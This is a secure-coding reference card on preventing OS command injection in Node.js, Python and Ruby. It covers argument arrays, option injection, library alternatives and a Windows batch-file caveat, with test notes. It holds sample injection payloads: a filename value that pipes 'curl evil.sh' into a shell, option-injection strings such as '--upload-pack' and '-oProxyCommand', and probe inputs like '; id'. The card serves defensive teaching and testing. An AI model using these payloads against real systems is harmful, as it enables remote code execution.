---
id: computing-software.web-development.node-express.os-command-injection-prevention
name: os-command-injection-prevention
category: computing-software
field: web-development
product: node-express
tags: [injection, command-injection, child-process, execfile, subprocess, security]
level: practitioner
status: verified
description: "Avoiding OS command injection: execFile/spawn with argument arrays instead of exec, Python subprocess lists, option injection via leading dashes, and safer library alternatives."
sources:
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  - https://nodejs.org/api/child_process.html
  - https://docs.python.org/3/library/subprocess.html#security-considerations
  - https://cwe.mitre.org/data/definitions/88.html
licence: Apache-2.0
version: 4
updated: 2026-11-17
---

# OS command injection

## 1. The bug
```js
exec(`convert ${req.query.file} out.png`);   // file = "x.png; curl evil.sh | sh" (POSIX sh; on Windows cmd.exe use "&", ";" is not a separator there)
```
`exec`, `execSync`, `spawn(..., { shell: true })`, Python `os.system`, `subprocess.run(cmd, shell=True)`, Ruby backticks/`system("string")`, PHP `shell_exec` all hand the string to `/bin/sh`, which interprets `; | & $() \` > <` and newlines.

## 2. Fix: no shell, argument arrays
```js
import { execFile } from "node:child_process";
import { promisify } from "node:util";
const run = promisify(execFile);
await run("convert", ["--", inputPath, "out.png"], { timeout: 30_000, maxBuffer: 10 * 1024 * 1024 });
```
```python
subprocess.run(["convert", "--", input_path, "out.png"], check=True, timeout=30)   # shell=False default
```
```ruby
system("convert", "--", input_path, "out.png")   # multi-arg form, no shell
```
Each array element is one argv entry - shell metacharacters are inert.

## 3. Argument (option) injection
Even without a shell, a value starting with `-` becomes an option: `git ls-remote --upload-pack=evil` (reproduced: git ran the command; `git ls-remote -- "--upload-pack=..."` is rejected), `tar --checkpoint-action=exec=...`, `curl -o /etc/...`. Defend:
- Put `--` before positional arguments (when the tool supports it).
- Validate against a strict pattern (`/^[\w.-]+$/`, no leading `-`) or map to allowlisted values.
- Prefer paths you generate (uploaded files saved under random names) over user-supplied names.

## 4. Better: avoid shelling out
Use libraries: `sharp` instead of ImageMagick CLI, `simple-git`/`isomorphic-git`, native `fs`/`zlib`/`archiver`. ImageMagick itself has a history of file-format exploits - restrict its `policy.xml` if used.

## 5. Windows note
`execFile` of `.bat`/`.cmd` invokes `cmd.exe` and re-parses arguments (CVE-2024-27980 "BatBadBut"); since the April 2024 Node security releases Node throws `EINVAL` unless `shell: true` (confirmed on Node 20.20 for `a.cmd` and `./a.cmd`; with `shell: true` cmd.exe re-parses the arguments, so never pass user input). Avoid batch files with user input.

## Verify
Grep for `exec(`, `execSync(`, `shell: true`, `shell=True`, `os.system`; Semgrep `detect-child-process`; test inputs `; id`, `$(id)`, `` `id` ``, `-oProxyCommand=id`.
## Checked
Run on Windows with Node 20.20 and Git for Windows: `exec` with `&` and `&&` in the filename ran the injected command; `;` did not (cmd.exe), and `$(...)` and backticks are not substituted by cmd.exe, so those payloads only work with POSIX `sh`. `execFile` with an argument array passed `x.png; echo INJECTED & echo X` and `$(id)` as plain strings. `--upload-pack` option injection executed through `execFile` with no shell; the `--` guard blocked it. `.cmd` gave EINVAL with and without `./`. Not checked: Linux, `tar --checkpoint-action`, `curl -o`, `-oProxyCommand`, Python `subprocess`, `shell: true` with a `.cmd`.
Linux pass (same setup, busybox `sh`): `;`, `&&` and `&` in the filename all run the injected command, and `$(...)` and backticks are substituted, unlike cmd.exe on Windows; `execFile` with an array still passes every payload as plain text. `.cmd` EINVAL does not apply on Linux. Not run on Linux: the `git ls-remote --upload-pack` case (no git in that environment).
